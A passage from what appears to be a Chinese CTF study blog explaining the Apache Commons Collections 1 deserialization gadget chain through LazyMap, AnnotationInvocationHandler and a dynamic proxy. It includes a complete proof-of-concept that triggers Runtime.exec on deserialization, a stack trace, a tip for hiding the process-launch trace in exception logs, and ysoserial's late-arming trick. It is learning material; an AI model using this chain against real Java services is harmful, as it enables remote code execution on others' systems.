&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>关注一下get()函数</p><ol><li>对于不存在的key，在访问时会尽心创建，调用<code>transform()</code>，否则直接使用属性的方法map.get()进行返回</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no need to wrap keySet, entrySet or values as they are views of</span></span><br><span class="line"><span class="comment">// existing map entries - you can&#x27;t do a map-style get on them.</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="LazyMap实现一下加深理解"><a href="#LazyMap实现一下加深理解" class="headerlink" title="LazyMap实现一下加深理解"></a>LazyMap实现一下加深理解</h3><blockquote><p>在idea中运行</p></blockquote><ol><li>LazyMap的一个小小实现，那这样要利用还是需要用到<code>ChainedTransformer</code>来构造调用链啊，最后再通过get()方法来进行利用而已(<em><strong>入口点</strong></em>)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LazyMap的实现</span></span><br><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(myMap,<span class="keyword">new</span> <span class="title class_">LazyMapTransformer</span>());</span><br><span class="line">        lazyMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        System.out.println(lazyMap.get(<span class="string">&quot;key2&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LazyMapTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;you called LazyMapTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;h3110 w0r1d&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><blockquote><p>需要用到动态代理是因为还是基于: sun.reflect.annotation.AnnotationInvocationHandler这一个类来构造payload的<br>基本原理详见《Java安全2_jdk动态代理》博客文章，这里讲一下和CC1的利用</p></blockquote><ol><li><p>已知利用类还是sun.reflect.annotation.AnnotationInvocationHandler，看一下源码，这里是在invoke()这里</p><ol><li>注意到如果var4(也就是Method var2.getName())已知不是被预制的那些方法的话，这里会调用到this.memberValues.get(var4)</li><li><strong>目标转移到使得memberValues是我们控制的恶意LazyMap</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如何调用这里的invoke()呢，注意到</p><ol><li><strong>实现了什么和继承了什么和类中实际写的东西一样重要</strong>，可以理解为<strong>定性分析</strong></li><li>这里其实就是动态代理需要传入handler，会在调用任何方法的时候调用这个handler的invoke()</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Proxy.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                      InvocationHandler h)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>知道动态代理后又要怎么进行利用呢，见下面的poc章节</p></li></ol><h2 id="CC1-LazyMap-poc"><a href="#CC1-LazyMap-poc" class="headerlink" title="CC1_LazyMap poc"></a>CC1_LazyMap poc</h2><blockquote><p>理解了CC1_TransformedMap链后再来LazyMap就很轻松了<br>基于p牛进行学习而来，也算是都是自己编写的了<br>利用版本也是一样的，LazyMap仍然无法解决CommonCollections1这条利用链在高版本Java（8u71以后）中的使用问题</p></blockquote><ol><li><p>上面复习了点动态代理概念(回去看看应用就懂了)，现在来先自己想一下要求</p><ol><li>要求一：将AnnotationinvocationHandler的设置为一个对象的动态代理，然后调用该对象的任意方法(注意避开几个被写明的)调用到invoke函数</li><li>要求二：将LazyMap设置为AnnotationinvocationHandler的memberValues，通过get不存在的key来触发恶意transform链子(上一条CC1是用到TransformedMap)</li><li>要求三：设置handler是AnnotationinvocationHandler的对象(被动态代理)需要调用某一个方法，想不到了<ol><li><em><strong>p牛思路</strong></em>: 通过再次进行包裹这个对象为AnnotationinvocationHandler，然后反序列化readObject()会调用到这个Map的方法比如<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>，此时会直接跳到动态代理，再到LazyMap的get中 –&gt; <strong>嫉妒甜菜</strong></li></ol></li></ol></li><li><p>虽然还会有报错，<strong>在transformers最后使用ConstantTransformer可以做到隐藏异常日志中的一些信息(隐蔽了启动进程的日志特征)</strong></p><ol><li>看调用栈和自己预想的是一样的，very good</li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassCastException: java.lang.String cannot be cast to java.util.Set</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy0</span>.entrySet(Unknown Source)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:346)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:601)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1004)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1891)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)</span><br><span class="line">at CC1.CC1_p_LazyMap.<span class="built_in">test</span>(CC1_p_LazyMap.java:78)</span><br><span class="line">at CC1.CC1_p_LazyMap.main(CC1_p_LazyMap.java:23)</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ysoserial的调用链，这个自己写的思路也是这样</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> *    ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment"> *        AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment"> *            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment"> *                AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment"> *                    LazyMap.get()</span></span><br><span class="line"><span class="comment"> *                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                                Method.invoke()</span></span><br><span class="line"><span class="comment"> *                                    Class.getMethod()</span></span><br><span class="line"><span class="comment"> *                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                                Method.invoke()</span></span><br><span class="line"><span class="comment"> *                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment"> *                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                                Method.invoke()</span></span><br><span class="line"><span class="comment"> *                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_p_LazyMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">            <span class="comment">// 依照思路是要给lazymap的转换器的</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    ,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 构造lazymap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 反射创建我的handler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">lazyHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);  <span class="comment">// 这里的Retention是没有作用的，用来占位</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 在readObject时调用invoke * * * * * */</span></span><br><span class="line">            <span class="comment">// 通过动态代理来调用invoke</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxyedLazyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),lazyMap.getClass().getInterfaces(),lazyHandler);</span><br><span class="line">            <span class="comment">// AnnotationInvocationHandler就可，有Iterator var4 = this.memberValues.entrySet().iterator();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class, proxyedLazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();    <span class="comment">// 这里如果注释掉不会弹出来计算器，但是要是不注释就会弹，说明正确的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ysoserial的其他操作"><a href="#ysoserial的其他操作" class="headerlink" title="ysoserial的其他操作"></a>ysoserial的其他操作</h2><ol><li><p>调试上述POC的时候，会发现弹出了两个计算器，或者没有执行到readObject的时候就弹出了计算器(虽然我不会)</p></li><li><p><strong>REASON:</strong> 在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了命令</p></li><li><p>ysoserial的处理: 在POC的最后才将执行命令的Transformer数组设置到transformerChain中，原因是避免本地生成序列化流的程序执行到命令（在调试程序的时候可能会触发一次Proxy#invoke ）</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0(%E4%B8%AD).md">依旧是信工所大牛</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化1_初识利用手法</title>
      <link href="/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"/>
      <url>/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</url>
      
